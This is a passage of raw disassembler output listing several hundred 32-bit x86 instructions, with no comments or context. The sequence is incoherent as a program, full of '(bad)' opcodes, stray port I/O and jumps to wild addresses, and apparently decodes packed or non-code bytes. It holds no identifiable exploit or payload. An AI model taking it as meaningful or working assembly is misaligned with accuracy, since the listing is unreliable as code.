  40ac45:	xor    al,0x65
  40ac47:	push   ss
  40ac48:	(bad)  
  40ac4a:	lds    ebp,FWORD PTR ss:[ecx+0x3c4ed294]
  40ac51:	lods   eax,DWORD PTR ds:[esi]
  40ac52:	nop
  40ac53:	ret    
  40ac54:	mov    eax,0x6cb9dcd
  40ac59:	out    dx,eax
  40ac5a:	retf   
  40ac5b:	rcl    BYTE PTR [esi-0x54ed8bdc],cl
  40ac61:	int    0x55
  40ac63:	push   esp
  40ac64:	sahf   
  40ac65:	cmp    al,bh
  40ac67:	(bad)  
  40ac68:	leave  
  40ac69:	inc    ebx
  40ac6a:	add    BYTE PTR ds:0xaabd8855,cl
  40ac70:	adc    dl,ah
  40ac72:	andps  xmm7,XMMWORD PTR [edx]
  40ac75:	or     al,0x30
  40ac77:	sub    eax,0xc1f67dc5
  40ac7c:	or     cl,BYTE PTR [edi-0x3b860a1]
  40ac82:	or     al,0x84
  40ac84:	stos   BYTE PTR es:[edi],al
  40ac85:	in     eax,0xe8
  40ac87:	and    dh,ah
  40ac89:	adc    esi,DWORD PTR [edx-0x26123fdd]
  40ac8f:	stos   DWORD PTR es:[edi],eax
  40ac90:	or     DWORD PTR [edi-0x32],esi
  40ac93:	je     0x40acb5
  40ac95:	cdq    
  40ac96:	xor    al,0x74
  40ac98:	rol    BYTE PTR [ebp+0x8f8b1cf],1
  40ac9e:	rol    bh,0x1
  40aca1:	popf   
  40aca2:	aam    0x38
  40aca4:	or     DWORD PTR [ebx+0x19],ebx
  40aca7:	loopne 0x40acab
  40aca9:	fs inc edx
  40acab:	aam    0xa1
  40acad:	mov    ds:0x89ddc591,al
  40acb2:	mov    bl,BYTE PTR [eax-0x72]
  40acb5:	data16 cmp ah,cl
  40acb8:	test   ebx,0xfe3afdb0
  40acbe:	xor    ebx,esp
  40acc0:	lds    edi,FWORD PTR [edx]
  40acc2:	push   ebp
  40acc3:	and    BYTE PTR [ecx-0x55d43a9a],0x9b
  40acca:	mov    edi,0xb5925278
  40accf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd0:	mov    ebx,0x851fe47d
  40acd5:	popf   
  40acd6:	sti    
  40acd7:	xor    esp,DWORD PTR ds:0xca170c1b
  40acdd:	popf   
  40acde:	out    dx,al
  40acdf:	in     eax,dx
  40ace0:	fld    DWORD PTR [esi]
  40ace2:	sub    eax,0x213b0c55
  40ace7:	dec    edx
  40ace8:	das    
  40ace9:	jns    0x40acc6
  40aceb:	inc    edi
  40acec:	ss stos DWORD PTR es:[edi],eax
  40acee:	cmp    eax,0xb7f12731
  40acf3:	and    BYTE PTR [ecx+0x11],cl
  40acf6:	cmp    ch,BYTE PTR [edi-0x9]
  40acf9:	div    BYTE PTR [edi]
  40acfb:	enter  0x768e,0x70
  40acff:	in     al,dx
  40ad00:	adc    BYTE PTR [eax+0x3],bh
  40ad03:	js     0x40ac88
  40ad05:	mov    fs,WORD PTR [ebp+esi*1-0x3a273a2e]
  40ad0c:	pop    ebp
  40ad0d:	jns    0x40acf8
  40ad0f:	not    DWORD PTR [edi-0x50]
  40ad12:	sub    eax,0x9518b703
  40ad17:	pop    ecx
  40ad18:	mov    dl,0xd3
  40ad1a:	mov    ah,0x26
  40ad1c:	fisubr DWORD PTR [esi+edx*2]
  40ad1f:	xchg   DWORD PTR [edi-0x66],ebx
  40ad22:	dec    edi
  40ad23:	adc    bh,0x41
  40ad26:	ss push cs
  40ad28:	push   esp
  40ad29:	xchg   edx,eax
  40ad2a:	or     DWORD PTR [edx+0x6e3de85b],esp
  40ad30:	xlat   BYTE PTR ds:[ebx]
  40ad31:	jne    0x40ad9f
  40ad33:	sub    ch,dh
  40ad35:	jecxz  0x40ad86
  40ad37:	jmp    0x775c0423
  40ad3c:	sbb    DWORD PTR [edx-0x66],0xfe855a0b
  40ad43:	aas    
  40ad44:	jmp    0x40ad94
  40ad46:	mov    eax,0x9064f59f
  40ad4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad4c:	js     0x40ad6f
  40ad4e:	imul   esp,DWORD PTR [ebx-0x2f],0xffffffb3
  40ad52:	ja     0x40ad6e
  40ad54:	push   0xffffffbf
  40ad56:	xchg   BYTE PTR [eax-0x26],al
  40ad59:	inc    edx
  40ad5a:	jno    0x40ad5b
  40ad5c:	loopne 0x40adb1
  40ad5e:	xchg   BYTE PTR [esi+0x2f],dh
  40ad61:	clc    
  40ad62:	nop
  40ad63:	and    esp,DWORD PTR [esi+eiz*2]
  40ad66:	mov    cl,0x28
  40ad68:	aas    
  40ad69:	or     BYTE PTR [ecx-0x56ade547],dh
  40ad6f:	sbb    BYTE PTR [eax+edi*2],dl
  40ad72:	adc    bh,dl
  40ad74:	fwait
  40ad75:	sub    BYTE PTR [ecx],bl
  40ad77:	cmp    edi,0x46
  40ad7a:	cli    
  40ad7b:	xchg   esi,eax
  40ad7c:	(bad)  
  40ad7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad7e:	pop    eax
  40ad7f:	push   es
  40ad80:	rcl    BYTE PTR [ecx],cl
  40ad82:	cdq    
  40ad83:	mov    esp,0x8d84457f
  40ad88:	(bad)  
  40ad89:	into   
  40ad8a:	in     eax,dx
  40ad8b:	sub    bh,dl
  40ad8d:	gs fs jne 0x40adbd
  40ad91:	call   0x10778d01
  40ad96:	adc    al,BYTE PTR es:[esi]
  40ad99:	test   BYTE PTR [edx+0x78],ah
  40ad9c:	bound  eax,QWORD PTR [ecx]
  40ad9e:	mov    edi,0xde59bd11
  40ada3:	and    DWORD PTR [edx-0x10],edx
  40ada6:	enter  0xe188,0x7c
  40adaa:	adc    al,0xfc
  40adac:	xor    ebx,esi
  40adae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adaf:	xchg   esi,eax
  40adb0:	push   esp
  40adb1:	add    dl,dh
  40adb3:	pop    ecx
  40adb4:	xchg   ecx,eax
  40adb5:	mov    cl,0x88
  40adb7:	test   al,0x17
  40adb9:	mov    esp,0x71614e4d
  40adbe:	iret   
  40adbf:	cdq    
  40adc0:	ret    
  40adc1:	sar    BYTE PTR [eax+eax*2+0x65],0x5a
  40adc6:	dec    ecx
  40adc7:	or     esp,DWORD PTR [eax+eiz*2+0x36]
  40adcb:	or     al,BYTE PTR [edx-0x2258a5a3]
  40add1:	and    bl,BYTE PTR [edi]
  40add3:	add    BYTE PTR [edi+0x4a8612a9],bh
  40add9:	sub    al,0x22
  40addb:	sub    BYTE PTR [eax-0x2b5c4d43],al
  40ade1:	mov    edi,0xd9c7afce
  40ade6:	inc    ebp
  40ade7:	cmc    
  40ade8:	lahf   
  40ade9:	aad    0xb0
  40adeb:	inc    edx
  40adec:	jl     0xe5c69b5
  40adf2:	shl    bl,1
  40adf4:	push   0xdc34ba9a
  40adf9:	lods   al,BYTE PTR ds:[esi]
  40adfa:	jns    0x40adbb
  40adfc:	xchg   BYTE PTR [eax+0x1e657390],bh
  40ae02:	add    eax,0xbb38b186
  40ae07:	add    DWORD PTR [ebp-0x74],esp
  40ae0a:	popa   
  40ae0b:	mov    esp,0x5cedba87
  40ae10:	xchg   ebx,eax
  40ae11:	mov    ?,WORD PTR [eax+0xebdc28d]
  40ae17:	lds    esp,FWORD PTR [eax+0x424bdd3]
  40ae1d:	xchg   esi,eax
  40ae1e:	mov    cl,0x9c
  40ae20:	jae    0x40ae99
  40ae22:	adc    edi,DWORD PTR [ebx]
  40ae24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae25:	cld    
  40ae26:	add    eax,ecx
  40ae28:	sub    cl,BYTE PTR [esi-0x80]
  40ae2b:	retf   0x3eda
  40ae2e:	scas   al,BYTE PTR es:[edi]
  40ae2f:	jns    0x40adf3
  40ae31:	aam    0x73
  40ae33:	pop    ebp
  40ae34:	mov    ebx,0x540855fc
  40ae39:	mov    esp,0x32e3c6be
  40ae3e:	or     BYTE PTR [esi+0x6b5b3cb2],ah
  40ae44:	idiv   BYTE PTR [ecx+0x5a5c5af4]
  40ae4a:	mov    ds:0x8dc280ee,al
  40ae4f:	stc    
  40ae50:	popa   
  40ae51:	mov    dl,0x87
  40ae53:	fldcw  WORD PTR [edx]
  40ae55:	xchg   BYTE PTR [eax-0x4e],bh
  40ae58:	jp     0x40ae73
  40ae5a:	push   esi
  40ae5b:	mov    WORD PTR [edi+0x17a20431],ds
  40ae61:	loopne 0x40ae8d
  40ae63:	mov    cl,0x95
  40ae65:	outs   dx,DWORD PTR ds:[esi]
  40ae66:	(bad)  
  40ae67:	mov    esp,0x52cc7c6
  40ae6c:	ret    
  40ae6d:	daa    
  40ae6e:	cmc    
  40ae6f:	test   DWORD PTR [edi+0x8],esi
  40ae72:	bound  esi,QWORD PTR [esi]
  40ae74:	(bad)  
  40ae75:	in     eax,0xb4
  40ae77:	outs   dx,DWORD PTR ds:[esi]
  40ae78:	push   esi
  40ae79:	shl    ebx,cl
  40ae7b:	adc    BYTE PTR [ebp+0x6521ae43],ah
  40ae81:	stos   DWORD PTR es:[edi],eax
  40ae82:	repz cld 
  40ae84:	repz leave 
  40ae86:	cwde   
  40ae87:	das    
  40ae88:	cmp    eax,0x71ae0f8f
  40ae8d:	add    DWORD PTR [edi+0x6],esp
  40ae90:	jne    0x40ae8d
  40ae92:	cdq    
  40ae93:	fisttp QWORD PTR [eax]
  40ae95:	fcmovnb st,st(7)
  40ae97:	jg     0x40ae68
  40ae99:	adc    dh,BYTE PTR [ebp+0x66]
  40ae9c:	mov    BYTE PTR [eax],0x84
  40ae9f:	jmp    0x40ae70
  40aea1:	push   ds
  40aea2:	adc    ebx,esp
  40aea4:	mov    dl,0x1a
  40aea6:	inc    ebx
  40aea7:	fst    DWORD PTR [edx+ebp*8+0x24]
  40aeab:	outs   dx,BYTE PTR ds:[esi]
  40aeac:	mov    ch,0xad
  40aeae:	das    
  40aeaf:	or     BYTE PTR [ecx-0x53],ah
  40aeb2:	cmp    eax,DWORD PTR [eax+esi*8-0x66e02591]
  40aeb9:	shl    BYTE PTR [edi],cl
  40aebb:	mov    ecx,0x83e52ed
  40aec0:	enter  0x3fe1,0x36
  40aec4:	std    
  40aec5:	jns    0x40aefd
  40aec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec8:	add    ebx,DWORD PTR [ecx-0x72]
  40aecb:	repnz idiv DWORD PTR [ecx+0x69]
  40aecf:	mov    edx,0x2b96976a
  40aed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aed5:	cmp    eax,0x1d7d5d6a
  40aeda:	in     eax,0x90
  40aedc:	idiv   DWORD PTR [ebp-0x5ec45f1e]
  40aee2:	neg    DWORD PTR [ebp+edx*1-0x118c4b2a]
  40aee9:	sub    DWORD PTR [ecx-0xdc46e65],eax
  40aeef:	scas   al,BYTE PTR es:[edi]
  40aef0:	icebp  
  40aef1:	ja     0x40aecd
  40aef3:	mov    al,0x1
  40aef5:	(bad)  
  40aef6:	sub    DWORD PTR [edi+0x4f],ecx
  40aef9:	ficom  WORD PTR [ebx+0x7ca3469c]
  40aeff:	(bad)  
  40af00:	lds    esi,FWORD PTR [eax-0x3c97109e]
  40af06:	icebp  
  40af07:	fsubr  DWORD PTR [edx-0x4d]
  40af0a:	test   BYTE PTR [edi+0x75],bl
  40af0d:	outs   dx,DWORD PTR ds:[esi]
  40af0e:	mov    bl,0xba
  40af10:	push   edx
  40af11:	xor    BYTE PTR [ebp+0x1],dl
  40af14:	jle    0x40aed9
  40af16:	pushf  
  40af17:	mov    ch,0x97
  40af19:	jno    0x40aedc
  40af1b:	cwde   
  40af1c:	mov    al,ds:0x3dde2f8c
  40af21:	sbb    DWORD PTR [eax],edi
  40af23:	xor    BYTE PTR [edi],dl
  40af25:	fsubr  DWORD PTR ds:0x5ac5c4f9
  40af2b:	jge    0x40aec3
  40af2d:	mov    esi,0x93aa68b3
  40af32:	fidiv  DWORD PTR [ebp-0x53]
  40af35:	cmp    edx,esp
  40af37:	push   ebx
  40af38:	ja     0x40af7a
  40af3a:	sub    al,0xf
  40af3c:	imul   edi,DWORD PTR [edx-0x3e400c3b],0x63
  40af43:	push   eax
  40af44:	mov    dh,0xd7
  40af46:	mov    ecx,0x5a765360
  40af4b:	dec    ebx
  40af4c:	sub    eax,0x18e1f22f
  40af51:	sub    al,0x1c
  40af53:	les    ebp,FWORD PTR [ebp+0x1b51c4f3]
  40af59:	mov    bl,0x6
  40af5b:	and    eax,0xa858b89d
  40af60:	sbb    BYTE PTR [eax],dl
  40af62:	sub    ch,dl
  40af64:	dec    edi
  40af65:	inc    edx
  40af66:	call   FWORD PTR [eax+0x59]
  40af69:	repz adc ebp,DWORD PTR [edx]
  40af6c:	mov    ch,0x90
  40af6e:	mov    WORD PTR [edi],?
  40af70:	add    eax,0xf4257226
  40af75:	mov    eax,0xba47a7ff
  40af7a:	push   ebx
  40af7b:	lahf   
  40af7c:	xor    al,0x8c
  40af7e:	jge    0x40afd1
  40af80:	or     BYTE PTR [edx-0x7ca76d58],ah
  40af86:	mov    dh,0x92
  40af88:	cmp    al,0x8
  40af8a:	aad    0x11
  40af8c:	adc    DWORD PTR [ebp+eiz*2+0x51b4ef68],edi
  40af93:	jg     0x40af3e
  40af95:	pop    esi
  40af96:	jp     0x40af36
  40af98:	lods   al,BYTE PTR ds:[esi]
  40af99:	push   ds
  40af9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af9b:	(bad)  
  40af9c:	in     al,dx
  40af9d:	dec    BYTE PTR [ecx-0x5d]
  40afa0:	in     al,0x2d
  40afa2:	adc    al,0x72
  40afa4:	rol    DWORD PTR [edi+0x3a],cl
  40afa7:	push   edx
  40afa8:	jge    0x40afc6
  40afaa:	cmp    DWORD PTR [edi],0xa13e179
  40afb0:	mov    ebx,es
  40afb2:	scas   al,BYTE PTR es:[edi]
  40afb3:	pop    ds
  40afb4:	dec    esp
  40afb5:	sqrtps xmm3,XMMWORD PTR [ebx-0x4b]
  40afb9:	pop    edx
  40afba:	cmp    DWORD PTR [edi+0x6cae6693],edi
  40afc0:	xchg   ecx,eax
  40afc1:	adc    ah,dl
  40afc3:	and    edx,ebp
  40afc5:	inc    ebx
  40afc6:	sbb    BYTE PTR [ebx],bh
  40afc8:	rcl    BYTE PTR [ecx-0x3632fd21],0x56
  40afcf:	(bad)  
  40afd0:	cwde   
  40afd1:	xchg   ecx,eax
  40afd2:	mov    esi,0xed936421
  40afd7:	cmp    eax,DWORD PTR [ecx+edx*8+0x5536e34d]
  40afde:	add    eax,0x98d9781c
  40afe3:	mov    al,0x8
  40afe5:	jecxz  0x40b055
  40afe7:	daa    
  40afe8:	fs pop ds
  40afea:	sub    DWORD PTR [eax-0x1],ebx
  40afed:	int3   
  40afee:	jmp    0x40afe2
  40aff0:	out    0xe7,al
  40aff2:	fild   WORD PTR [esi+0x75]
  40aff5:	jns    0x40afac
  40aff7:	and    BYTE PTR [esi+edx*2-0x66],cl
  40affb:	sbb    eax,0xd25f6164
  40b000:	push   0xffffffa6
  40b002:	mov    esp,0x91188f87
  40b007:	or     DWORD PTR [edi-0x29],ebp
  40b00a:	aaa    
  40b00b:	ror    DWORD PTR [edi+0x39],cl
  40b00e:	inc    esp
  40b00f:	gs pop edi
  40b011:	fisub  WORD PTR [ebx+ebx*2+0x552e35ed]
  40b018:	fist   DWORD PTR [ebp-0x7f]
  40b01b:	mov    WORD PTR [ebp-0x4],fs
  40b01e:	scas   al,BYTE PTR es:[edi]
  40b01f:	mov    DWORD PTR [esp+edx*1-0x5c],0xe650c1b4
  40b027:	push   ds
  40b028:	repz add BYTE PTR [edx+0x11e14a93],cl
  40b02f:	cld    
  40b030:	into   
  40b031:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40b033:	xor    edi,0xad7d3dd4
  40b039:	mov    bh,0x68
  40b03b:	cmp    BYTE PTR [edx],ch
  40b03d:	adc    DWORD PTR [eax],edi
  40b03f:	sti    
  40b040:	push   esp
  40b041:	sti    
  40b042:	lea    esp,[esi+0x4968e589]
  40b048:	jmp    0xc2f240f1
  40b04d:	mov    ds,esp
  40b04f:	push   edi
  40b050:	push   eax
  40b051:	sbb    ebp,ebx
  40b053:	pinsrw mm3,WORD PTR [ecx],0xc3
  40b057:	outs   dx,BYTE PTR ds:[esi]
  40b058:	outs   dx,BYTE PTR ds:[esi]
  40b059:	inc    ebp
  40b05a:	cmp    DWORD PTR [ecx-0x20],ebp
  40b05d:	and    BYTE PTR [ebp-0x35c6d285],0xf7
  40b064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b065:	mov    DWORD PTR [esi+0x3e],ebp
  40b068:	(bad)  
  40b069:	sbb    DWORD PTR [ebp+eax*4+0x48],eax
  40b06d:	leave  
  40b06e:	pop    ebp
  40b06f:	addr16 mov edi,0x76e53a26
  40b075:	rcr    edx,cl
  40b077:	ret    0xd3ad
  40b07a:	pop    es
  40b07b:	mov    esp,0x690566f1
  40b080:	cmp    eax,0x6b27748
  40b085:	fistp  DWORD PTR [esi+eiz*2+0x33f5ca78]
  40b08c:	imul   ax,WORD PTR [eax+0x68],0xdb5a
  40b092:	push   esi
  40b093:	or     bl,BYTE PTR [ecx]
  40b095:	shl    BYTE PTR [edi-0xefe1ea1],1
  40b09b:	inc    ecx
  40b09c:	xchg   esp,eax
  40b09d:	sbb    DWORD PTR [ebp-0x7522ec71],ebx
  40b0a3:	and    eax,DWORD PTR [esi-0x3a]
  40b0a6:	sub    BYTE PTR [edx-0x5f],dl
  40b0a9:	or     dl,BYTE PTR [esi-0x74]
  40b0ac:	xor    al,0x45
  40b0ae:	shr    BYTE PTR [esi+0x41],1
  40b0b1:	lods   eax,DWORD PTR ds:[esi]
  40b0b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0b3:	(bad)  
  40b0b4:	dec    ebx
  40b0b5:	call   0x4e07cc3f
  40b0ba:	test   al,0xea
  40b0bc:	cdq    
  40b0bd:	outs   dx,BYTE PTR cs:[esi]
  40b0bf:	call   0xd008b0ba
  40b0c4:	mov    esi,DWORD PTR [esi+0x20758138]
  40b0ca:	xchg   BYTE PTR [edi-0x5e5bc186],cl
  40b0d0:	xchg   esi,eax
  40b0d1:	in     al,0x86
  40b0d3:	arpl   WORD PTR [ebp-0x5464d25e],dx
  40b0d9:	ret    0xc7d4
  40b0dc:	cs js  0x40b0e9
  40b0df:	jno    0x40b099
  40b0e1:	outs   dx,BYTE PTR ds:[esi]
  40b0e2:	pop    eax
  40b0e3:	mov    al,ds:0xd2a2fe83
  40b0e8:	lea    ecx,[ecx+0x14]
  40b0eb:	push   es
  40b0ec:	jmp    0x8e72cd76
  40b0f1:	jmp    0x485c:0xcc61580e
  40b0f8:	pusha  
  40b0f9:	xlat   BYTE PTR ds:[ebx]
  40b0fa:	and    BYTE PTR [eax-0x6039ad05],ah
  40b100:	imul   edx,DWORD PTR [ecx+ebp*4-0x4d444b5f],0xfa2e5ed0
  40b10b:	stc    
  40b10c:	dec    esi
  40b10d:	adc    eax,0xab81c551
  40b112:	or     eax,0xc792f514
  40b117:	mov    bh,0xad
  40b119:	pop    esp
  40b11a:	rcr    dh,cl
  40b11c:	lock cld 
  40b11e:	shl    BYTE PTR [ebx],cl
  40b120:	sbb    al,0x71
  40b122:	cmp    DWORD PTR [ebp+edi*1+0x17],0x6666d116
  40b12a:	jmp    0xe8c:0xfa5df601
  40b131:	add    al,0xb0
  40b133:	cdq    
  40b134:	inc    esi
  40b135:	imul   ebp,DWORD PTR [ecx-0x2c],0x140d3782
  40b13c:	push   ebx
  40b13d:	sub    edi,DWORD PTR [edx-0x23]
  40b140:	inc    esp
  40b141:	mov    eax,0xb7b17d3
  40b146:	mov    dh,0x98
  40b148:	jno    0x40b166
  40b14a:	pop    ecx
  40b14b:	inc    esi
  40b14c:	repnz sub ecx,ebp
  40b14f:	leave  
  40b150:	mov    edi,0xe23b680a
  40b155:	and    al,0xcf
  40b157:	cli    
  40b158:	push   es
  40b159:	jp     0x40b1a8
  40b15b:	and    eax,0x1e088d5c
  40b160:	mov    bh,0x7
  40b162:	xchg   ecx,eax
  40b163:	rcl    bh,0x88
  40b166:	mov    eax,0xb00a161a
  40b16b:	data16 add al,0xa6
  40b16e:	in     al,dx
  40b16f:	pop    ds
  40b170:	adc    eax,0xb8666520
  40b175:	das    
  40b176:	push   ss
  40b177:	pop    ecx
  40b178:	loop   0x40b186
  40b17a:	cs pop esp
  40b17c:	pop    ebp
  40b17d:	adc    BYTE PTR [edi+0xf],ah
  40b180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b181:	lea    esi,[eax+0xf]
  40b184:	ins    BYTE PTR es:[edi],dx
  40b185:	dec    esi
  40b186:	outs   dx,BYTE PTR ds:[esi]
  40b187:	lods   al,BYTE PTR ds:[esi]
  40b188:	gs jecxz 0x40b17a
  40b18b:	ret    
  40b18c:	push   es
  40b18d:	iret   
  40b18e:	idiv   DWORD PTR [esi+0x33]
  40b191:	stos   BYTE PTR es:[edi],al
  40b192:	bound  ebp,QWORD PTR [edx+0x14]
  40b195:	pusha  
  40b196:	or     dl,BYTE PTR [ecx+0x5]
  40b199:	pushf  
  40b19a:	call   0xb450:0x595af061
  40b1a1:	cmp    DWORD PTR [esi],edx
  40b1a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a4:	push   0x1c
  40b1a6:	mov    bl,0xf
  40b1a8:	and    DWORD PTR [ecx-0x12],ebp
  40b1ab:	push   edi
  40b1ac:	mov    esp,0x145c7211
  40b1b1:	retf   
  40b1b2:	pop    edx
  40b1b3:	xchg   edi,eax
  40b1b4:	dec    ebx
  40b1b5:	fsub   st(5),st
  40b1b7:	test   al,0x76
  40b1b9:	push   ecx
  40b1ba:	jmp    FWORD PTR [ebx]
  40b1bc:	add    bl,dh
  40b1be:	xchg   edx,eax
  40b1bf:	(bad)  
  40b1c0:	mov    ecx,0xb01dfa9c
  40b1c5:	retf   
  40b1c6:	les    ebx,FWORD PTR [ebx+0x9ab83cc]
  40b1cc:	js     0x40b17f
  40b1ce:	dec    edi
  40b1cf:	sbb    DWORD PTR [ecx-0x7a],0xffffffd9
  40b1d3:	sub    esi,DWORD PTR [eax]
  40b1d5:	jb     0x40b204
  40b1d7:	mov    ebx,0xdc7795e3
  40b1dc:	sbb    BYTE PTR [esi+ebp*1],bh
  40b1df:	sub    DWORD PTR [edx],esi
  40b1e1:	aad    0xb3
  40b1e3:	sub    dl,cl
  40b1e5:	outs   dx,DWORD PTR ds:[esi]
  40b1e6:	or     ecx,ebp
  40b1e8:	idiv   bl
  40b1ea:	jns    0x40b208
  40b1ec:	mov    ecx,0x9826d70f
  40b1f1:	or     DWORD PTR [edx+ebp*8],esi
  40b1f4:	addr16 ret 
  40b1f6:	outs   dx,DWORD PTR ds:[esi]
  40b1f7:	jge    0x40b1e6
  40b1f9:	dec    esi
  40b1fa:	and    ch,BYTE PTR [edx+edi*4]
  40b1fd:	xchg   esp,eax
  40b1fe:	sahf   
  40b1ff:	addr16 inc eax
  40b201:	dec    ebx
  40b202:	mov    esi,ecx
  40b204:	xchg   edx,eax
  40b205:	(bad)  
  40b206:	cmp    eax,0xb628cadc
  40b20b:	mov    ebp,0xd9323d81
  40b210:	mov    ds:0xaa192150,eax
  40b215:	xchg   esp,eax
  40b216:	ret    
  40b217:	or     DWORD PTR [ebp-0x3e04ef1d],edi
  40b21d:	repz mov ah,0x5
  40b220:	jmp    0xa60fec6c
  40b225:	pop    esi
  40b226:	pop    esp
  40b227:	adc    al,BYTE PTR [eax-0x43]
  40b22a:	mov    ch,BYTE PTR [edi-0x234abcb1]
  40b230:	xchg   edi,eax
  40b231:	xchg   ecx,eax
  40b232:	in     eax,0xde
  40b234:	setnp  BYTE PTR [ebx-0x2ec9fbe5]
  40b23b:	mov    edi,0x2544d97a
  40b240:	jp     0x40b1d2
  40b242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b243:	dec    eax
  40b244:	into   
  40b245:	or     eax,0x88e13a1e
  40b24a:	icebp  
  40b24b:	popf   
  40b24c:	mov    al,0xe9
  40b24e:	xchg   ecx,eax
  40b24f:	add    ebx,edi
  40b251:	ss or  di,si
  40b255:	or     DWORD PTR [esp+esi*2-0x66],ebp
  40b259:	dec    ebx
  40b25a:	push   ds
  40b25b:	imul   esi,DWORD PTR [ebp*1+0x5534560],0xffffffa0
  40b263:	iret   
  40b264:	pop    ebx
  40b265:	das    
  40b266:	push   eax
  40b267:	or     dh,BYTE PTR [ebx-0x1a]
  40b26a:	in     eax,0x69
  40b26c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b26d:	xchg   ecx,eax
  40b26e:	adc    DWORD PTR [esi+0x6fd66f83],ecx
  40b274:	int3   
  40b275:	pop    ss
  40b276:	(bad)  
  40b278:	(bad)  
  40b279:	and    eax,0xa3fcd178
  40b27e:	repnz push ecx
  40b280:	cli    
  40b281:	push   ecx
  40b282:	loop   0x40b2eb
  40b284:	cmp    DWORD PTR [esi-0x2a],eax
  40b287:	sub    BYTE PTR [eax],0x17
  40b28a:	and    al,0xb8
  40b28c:	repz retf 0x7d48
  40b290:	xlat   BYTE PTR ds:[ebx]
  40b291:	fnsave [ebx-0xe]
  40b294:	loope  0x40b2f9
  40b296:	test   BYTE PTR [ecx-0x67c88778],0xed
  40b29d:	sbb    DWORD PTR [edx+0x4f60de00],0x85c1eeaf
  40b2a7:	dec    edx
  40b2a8:	sti    
  40b2a9:	fdiv   DWORD PTR [ebx]
  40b2ab:	xchg   eax,esi
  40b2ad:	sbb    eax,0x2d312baa
  40b2b2:	or     BYTE PTR [ebx+0x45dc63f2],dh
  40b2b8:	lock pop ss
  40b2ba:	imul   ebx,esi,0x42ff2fbc
  40b2c0:	dec    edi
  40b2c1:	add    cl,cl
  40b2c3:	push   0x63
  40b2c5:	inc    esi
  40b2c6:	or     DWORD PTR [ebx+0x48],eax
  40b2c9:	mov    ebp,0xe1227b88
  40b2ce:	or     eax,DWORD PTR [ecx-0x5eb893b8]
  40b2d4:	xor    ebp,DWORD PTR [eax]
  40b2d6:	test   ecx,0xf18f1428
  40b2dc:	jge    0x40b2e7
  40b2de:	sbb    al,0x85
  40b2e0:	mov    ah,0x97
  40b2e2:	pop    ebx
  40b2e3:	sti    
  40b2e4:	sub    DWORD PTR [ebp-0x7e33268],edx
  40b2ea:	call   0x5870:0x7ed81467
  40b2f1:	outs   dx,BYTE PTR ds:[esi]
  40b2f2:	stos   DWORD PTR es:[edi],eax
  40b2f3:	lea    esp,[ecx]
  40b2f5:	mov    bh,0xe0
  40b2f7:	leave  
  40b2f8:	inc    edx
  40b2f9:	xchg   edx,eax
  40b2fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2fb:	sbb    eax,0xcfbb6ff0
  40b300:	push   cs
  40b301:	cmp    esp,DWORD PTR [ebx+eiz*1-0x1]
  40b305:	pushf  
  40b306:	push   edi
  40b307:	mov    BYTE PTR [edi+edx*4+0x3f0fa1c],ah
  40b30e:	lock push 0x7587d278
  40b314:	outs   dx,BYTE PTR ds:[esi]
  40b315:	cmp    cl,BYTE PTR [edx+0x1a]
  40b318:	jle    0x40b364
  40b31a:	jo     0x40b349
  40b31c:	out    dx,al
  40b31d:	add    edx,esp
  40b31f:	xchg   esi,eax
  40b320:	xchg   BYTE PTR [esi-0x23],bl
  40b323:	clc    
  40b324:	fs mov dl,0x1c
  40b327:	data16 mov ch,0xa
  40b32a:	or     al,0x71
  40b32c:	or     BYTE PTR [esi],bh
  40b32e:	js     0x40b34d
  40b330:	arpl   dx,di
  40b332:	packssdw mm4,QWORD PTR [esi]
  40b335:	push   cs
  40b336:	or     BYTE PTR [edi],dh
  40b338:	mov    WORD PTR [eax-0x58],fs
  40b33b:	fist   DWORD PTR ds:0xf294940f
  40b341:	cmp    dl,BYTE PTR [eax+0x7f]
  40b344:	stos   BYTE PTR es:[edi],al
  40b345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b346:	sbb    cl,BYTE PTR [ebp+0x5147f7bf]
  40b34c:	icebp  
  40b34d:	add    al,0x3a
  40b34f:	xchg   esp,eax
  40b350:	mov    ebp,ecx
  40b352:	inc    edi
  40b353:	pop    eax
  40b354:	leave  
  40b355:	inc    esp
  40b356:	mov    dh,0xbb
  40b358:	and    dl,BYTE PTR [edi]
  40b35a:	das    
  40b35b:	fldcw  WORD PTR [esi+0x68]
  40b35e:	pop    ebx
  40b35f:	das    
  40b360:	ret    
  40b361:	pop    es
  40b362:	fsub   QWORD PTR [edx]
  40b364:	and    al,0x5d
  40b366:	(bad)  
  40b367:	in     eax,dx
  40b368:	stc    
  40b369:	je     0x40b3cf
  40b36b:	fcomp  QWORD PTR [esi-0x9dcb4ff]
  40b371:	and    ch,al
  40b373:	or     eax,eax
  40b375:	(bad)  
  40b376:	test   eax,0x496e7fe8
  40b37b:	jp     0x40b3a1
  40b37d:	in     al,dx
  40b37e:	mov    ebx,0xa27cb753
  40b383:	fiadd  DWORD PTR [edx+0x19]
  40b386:	mov    DWORD PTR [esi+0x5e25f192],ebx
  40b38c:	sbb    bl,bh
  40b38e:	sub    eax,0xabcb6649
  40b393:	fld    QWORD PTR [esi-0xc9c8bae]
  40b399:	cld    
  40b39a:	cmp    al,0xfe
  40b39c:	mov    al,0xda
  40b39e:	mov    ch,0x45
  40b3a0:	ins    DWORD PTR es:[edi],dx
  40b3a1:	stos   DWORD PTR es:[edi],eax
  40b3a2:	mov    ch,0xda
  40b3a4:	pop    esi
  40b3a5:	push   ecx
  40b3a6:	outs   dx,BYTE PTR ds:[esi]
